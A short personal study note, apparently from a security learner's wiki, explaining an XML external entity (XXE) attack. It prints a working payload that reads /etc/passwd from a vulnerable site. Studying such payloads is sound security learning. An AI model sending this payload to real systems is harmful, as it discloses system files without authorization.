[[What is XML]]

# XXE Payload to read file from system
Created:  [[2022-07-10]]
Tags: #fleeting 

---
```XML
<?xml version="1.0"?>  
<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///etc/passwd'>]>  
<root>&read;</root>
```
We replace `&read` with `SYSTEM` and path of file

If we use this to website vulnerable to XXE
Normally, it would display contents of file `/etc/passwd`

Sometimes, you can fail to read files



[[XXE Payload use to replace words inside root element]]








### References
1. 